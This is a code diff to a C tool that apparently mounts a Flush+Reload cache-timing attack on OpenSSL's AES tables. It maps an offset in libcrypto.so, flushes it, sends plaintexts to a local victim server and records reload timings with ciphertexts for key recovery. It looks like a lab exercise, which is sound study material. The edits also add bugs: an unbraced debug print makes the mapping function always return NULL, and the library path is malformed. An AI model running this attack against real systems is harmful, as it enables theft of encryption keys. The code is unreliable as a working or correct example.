@@ -101,17 +101,22 @@ void parseOpt(int argc, char *argv[])
 int main(int argc, char** argv)
 {
     int i;
+    printf("\nWelcome!.\nInitializing program...\n");
     parseOpt(argc, argv);
-    printf("begin\n");
+    //printf("\t[DEBUG]: parseOpt(...) completed.\n");
+    //printf("begin\n");
     init();
-    printf("Collecting data\n");
+    //printf("\tinit() completed.\n");
+    //printf("Done.\n");
     for (i = 0; i < numTraces; i++){
-#ifdef DEBUG
-        printf("Sample: %i\n", i);
-#endif
+//#ifdef DEBUG
+    printf("Sample number %i out of 1,000,000.\n", i + 1);
+//#endif
         doTrace();
     }
+    printf("\t[DEBUG]: Done receiving data.\n");
     finish();
+    printf("\t[DEBUG]: finish() completed.\n");
     printf("Done\n");
 }
 
@@ -129,14 +134,17 @@ void savePlaintext()
 {
     if(plainFP == NULL)
         return;
+    printText(plaintext, 16, "printText being saved");
     fwrite(plaintext, sizeof(uint8_t), 16, plainFP);
 }
 void saveCiphertext()
 {
+    printText(ciphertext, 16, "ciphertextText being saved");
     fwrite(ciphertext, sizeof(uint8_t), 16, cipherFP);
 }
 void saveTiming()
 {
+    printText(timing, 16, "timing being saved");
     fwrite(timing, sizeof(uint32_t), 1, timingFP);
 }
 void saveTrace()
@@ -175,11 +183,63 @@ uint32_t reload(void *target)
     t1 = timer_start();
     maccess(target);
     t2 = timer_stop();
+    printf("\t\tt1 = %i, t2 = %i\n", t1, t2);
     return t2 - t1;
 }
 
-void doTrace()
-{
+void doTrace() {
+    int r;
+    socklen_t serverlen;
+    //printf("\t[DEBUG]: Starting doTrace();\n");
+    printf("\tGenerating random text... ");
+    generatePlaintext();
+    printf("Done.\n\tFlushing T0... ");
+    clflush(&target);                // Flushing T0
+    //printf("\t[DEBUG]: T0 flushed.\n");
+    printf("Done.\n\tSending text to victim... ");
+    //if (sendto(s, plaintext, 16, 0, (struct sockaddr*) &server, sizeof server) == -1) exit(EXIT_FAILURE);     // Sending the plaintext to the server.
+    //sendto(s, plaintext, 16, 0, (struct sockaddr*) &server, sizeof server);
+    send(s, plaintext, 16, 0);
+
+    printf("Done.\n");
+    
+    //printText(plaintext, 16, "plainText");
+    //printf("\t[DEBUG]: message sent to server.\n");
+
+    bool break_loop = false;
+    while (break_loop == false) {
+        // printf("\t\t[doTrace() - DEBUG]: Awaiting communication started.\n");
+        serverlen = sizeof server;
+        printf("\tWaiting for incoming message... ");
+        //r = recvfrom(s, ciphertext, sizeof ciphertext, 0, (struct sockaddr*) &server, &serverlen);
+        //r = accept(s, ciphertext, sizeof ciphertext, 0, (struct sockaddr*) &server, &serverlen);
+        r = read( s , ciphertext, 16);
+
+
+
+        //printf("\t\t[doTrace() - DEBUG]: Message  received. r size = %i. Ciphertext size = %i.\n", r, sizeof ciphertext);
+        printf("Done.\n\tReloading T0 and calculating time... ");
+        // printText(ciphertext, 16, "Cihpertext");
+        break_loop = true;
+        // if ((r<16) && (r > sizeof ciphertext)) {
+        //     printf("\t\t[doTrace() - DEBUG]: loop will break now.");
+        //     break_loop = true;
+        // }
+        /*if (r < 16) continue;
+        printf("\t[DEBUG]: 'r < 16' continued.\n");
+        if (r > sizeof ciphertext) continue;
+        printf("\t[DEBUG]: 'r > sizeof ciphertext' continued.\n");*/
+        // The code has to break of the loop once a message has been printed.
+    }
+    // We should have the incoming message by now.
+    // printf("\t\t[doTrace() - DEBUG]: done receiving. Reloading now.\n");
+    *timing = reload(&target);     // reloading T0 and adquiring the timie.
+    //printf("\t\t[doTrace() - DEBUG]: Done reloading, saving now.\n");
+    printf("Done.\n\tSaving values... ");
+    saveTrace();        // Saving the data to the files.
+
+    printf("Done.\n\tSample completed.\n\n");
+
     // generate a new plaintext
     // set the cache to a known state by flushing an address
     // send the plaintext to victim (server)for an encryption and receive the ciphertex
@@ -190,6 +250,9 @@ void doTrace()
     printf("Timing: %i\n", *timing);
 #endif
 }
+
+
+
 void printText(uint8_t *text, int count, char *header)
 {
     int j;
@@ -203,11 +266,14 @@ void *map_offset(const char *file, size_t offset) {
   int fd = open(file, O_RDONLY);
   if (fd < 0)
     return NULL;
+    printf("\t[DEBUG]: fd < 0 .\n");
 
   char *mapaddress = mmap(0, sysconf(_SC_PAGE_SIZE), PROT_READ, MAP_PRIVATE, fd, offset & ~(sysconf(_SC_PAGE_SIZE) -1));
   close(fd);
   if (mapaddress == MAP_FAILED)
+    printf("\t[DEBUG]: Map Failed.\n");
     return NULL;
+  printf("\t[DEBUG]: mapping done succesfully.\n");
   return (void *)(mapaddress+(offset & (sysconf(_SC_PAGE_SIZE) -1)));
 }
 
@@ -218,39 +284,45 @@ void unmap_offset(void *address) {
 
 void init()
 {
+    //printf("\t[init() - DEBUG]: init() started.\n");
     // setup network communication
-    printf("setting up network communication\n");
-    if (!inet_aton("127.0.0.1", &server.sin_addr)) exit(100);
-
+    printf("\tSetting up network address... ");
+    if (inet_pton(AF_INET, "127.0.0.1", &server.sin_addr) <= 0) exit(100);
+    printf("Done.\n");
     server.sin_family = AF_INET;
     server.sin_port = htons(10000);
 
+    printf("\tCreating socket... ");
     if ((s = socket(AF_INET, SOCK_DGRAM, 0)) == -1) exit(101);
-
+    //printf("\t\t[init() - DEBUG]: Socket created.\n");
     if (connect(s, (struct sockaddr *) &server, sizeof server) == -1) exit(102);
-
+    //printf("\t\t[init() - DEBUG]: Socket connected to server.\n");
     // setup the target for monitoring
-    printf("setting up target\n");
-    target = NULL;
+    printf("Done.\n\tsetting up target... ");
 
-// #ifdef DEBUG
-    printf("offset: %x\n", offset);
-    printf("target: %p\n", target);
-    printText(target, 16, "Target");
+    //target = 00000000002a0d40;
+    //target = 0x2a0d40;
+    target = map_offset("~openssl/libcrypto.so", 0x2a0d40);
+
+//#ifdef DEBUG
+    //printf("offset: %zu\n", offset);
+    //printf("target: %p\n", target);
+    //printText(target, 16, "Target");
     // printText(target + 256 * 4, 16, "T1");
-// #endif
-
+//#endif
+    
     // setup files pointer for writing
-    printf("preparing data collection\n");
+    printf("Done.\n\tPreparing output files... ");
     plaintext = (uint8_t *) malloc(sizeof(uint8_t) * 16);
     ciphertext = (uint8_t *) malloc(sizeof(uint8_t) * 16);
     timing = (uint32_t *) malloc(sizeof(uint32_t));
-
+    
     timingFP = fopen(timingFileName, "w");
     cipherFP = fopen(cipherFileName, "w");
     if (plainFileName != NULL){
         plainFP = fopen(plainFileName, "w");
     }
+    printf("Done.\n\tAll finished.\n\n");
 }
 void finish()
 {
